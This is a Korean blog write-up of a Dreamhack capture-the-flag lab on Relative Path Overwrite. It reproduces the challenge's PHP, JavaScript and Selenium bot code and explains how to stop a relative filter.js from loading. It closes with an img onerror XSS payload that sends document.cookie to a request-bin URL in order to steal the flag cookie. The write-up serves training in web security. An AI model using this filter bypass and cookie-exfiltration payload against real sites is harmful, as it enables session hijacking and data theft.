---
title: (35) Dreamhack Relative Path Overwrite 문제 풀이
date: 2024-02-12 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 풀이
또 그 페이지 입니다.
![](https://kyuyeop.github.io/assets/img/post/35/1.png)
일단 메인페이지 입니다. 코드는 특별한건 없습니다.
```php
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Relative-Path-Overwrite</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Relative-Path-Overwrite</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/?page=vuln&param=dreamhack">Vuln page</a></li>
            <li><a href="/?page=report">Report</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <?php
          $page = $_GET['page'] ? $_GET['page'].'.php' : 'main.php';
          if (!strpos($page, "..") && !strpos($page, ":") && !strpos($page, "/"))
              include $page;
      ?>
    </div> 
</body>
</html>
```
![](https://kyuyeop.github.io/assets/img/post/35/2.png)
vuln페이지 입니다.
```php
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");
    if (typeof filter !== 'undefined') {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }

    param_elem.innerHTML = param;
</script>
```
위 코드에서 가져온 `filter.js`의 내용은 다음과 같습니다.
```javascript
var filter = ["script", "on", "frame", "object"];
```
![](https://kyuyeop.github.io/assets/img/post/35/3.png)
```php
<?php
if(isset($_POST['path'])){
    exec(escapeshellcmd("python3 /bot.py " . escapeshellarg(base64_encode($_POST['path']))) . " 2>/dev/null &", $output);
    echo($output[0]);
}
?>

<form method="POST" class="form-inline">
    <div class="form-group">
        <label class="sr-only" for="path">/</label>
        <div class="input-group">
            <div class="input-group-addon">http://127.0.0.1/</div>
            <input type="text" class="form-control" id="path" name="path" placeholder="/">
        </div>
    </div>
    <button type="submit" class="btn btn-primary">Report</button>
</form>
```
페이지의 구현 코드들은 위와 같고, 위 코드에서 나오는 `bot.py`은 다음과 같습니다.
```python
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import sys
import base64

if len(sys.argv) < 2:
    exit(-1)

if len(sys.argv[1]) == 0:
    exit(-1)

path = base64.b64decode(sys.argv[1]).decode('latin-1')

try:
    FLAG = open('/flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

def read_url(url, cookie={'name': 'name', 'value': 'value'}):
    cookie.update({'domain':'127.0.0.1'})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in ['headless', 'window-size=1920x1080', 'disable-gpu', 'no-sandbox', 'disable-dev-shm-usage']:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get('http://127.0.0.1/')
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        driver.quit()
        return False
    driver.quit()
    return True

def check_xss(path, cookie={'name': 'name', 'value': 'value'}):
    url = f'http://127.0.0.1/{path}'
    return read_url(url, cookie)

if not check_xss(path, {'name': 'flag', 'value': FLAG.strip()}):
    print('<script>alert("wrong??");history.go(-1);</script>')
else:
    print('<script>alert("good");history.go(-1);</script>')
```
사이트는 index.php에 page로 넘긴 파일을 렌더링하는 방식으로 작동합니다.  
flag는 `bot.py`에 있고, `report.php`에 입력한 내용이 인코딩되어 `bot.py`로 보내지고, `bot.py`에서 쿠키에 flag를 담아 입력 url로 접속하는 방식입니다.  
  
vuln 페이지에는 `filter.js`를 이용해 blacklist 목록을 불러옵니다. 만약 일치하는게 있다면 `nope`을 출력하고요.  
이를 우회하는건 이 문제의 이름인 Relative Path Overwrite을 이용해 가능합니다.  
  
해당 페이지에서 파일을 가져오는 방식은 상대경로를 이용합니다. 즉, 파일이 불러와질 경로를 바꿀 수 있다면 `filter.js`를 불러오지 못하게 할 수 있습니다.
```
index.php/?page=vuln&param=
```
위와 같은 경로로 접근하게 된다면 클라이언트에서는 `index.php`를 보고 있지만, 서버는 `index.php`를 폴더로 간주하여 `index.php/filter.js`를 불러오려고 하다가 실패할 겁니다. 이로써 필터링을 무력화하고 xss가 가능합니다.  
  
이전에 문제들은 memo 페이지가 있어서 거기에 저장하는 방식으로 문제를 풀었지만, 이번에는 저장하는 페이지가 없으므로 다른 사이트의 도움을 받도록 하겠습니다.  
바로 [드림핵 툴즈](https://tools.dreamhack.games/main)입니다. 이 중에 request bin을 이용하면 생성된 url로 들어오는 요청들을 확인할 수 있습니다.  
  
이 위치로 cookie를 보내도록 하면 되겠습니다.  
  
앞서 xss 필터링을 무력화 시켰습니다. xss 기법을 이용해 드림핵 툴즈에서 생성한 url에 접근하도록 만들어줍시다.
```
index.php/?page=vuln&param=<img src="" onerror="location='https://lzjhnje.request.dreamhack.games?'%2bdocument.cookie">
```
param값이 vuln페이지에 들어갈때 url decode가 되므로 `+`대신 `%2b`로 바꾸어 넣어줘야 합니다.  
script 태그는 이유는 정확히 모르겠으나 작동을 안하네요. 프론트엔드에서도 잘 보이는데 이상하네요. `<img>`를 이용하니 가능해서 일단 해결했습니다. 추가한게 실행한것보다 위에 있어서 실행이 안된게 아닌가 생각해봅니다.  
  
아무튼 이렇게 넣고 report를 누르면
![](https://kyuyeop.github.io/assets/img/post/35/4.png)
이렇게 flag가 도착해 있습니다.
{% endraw %}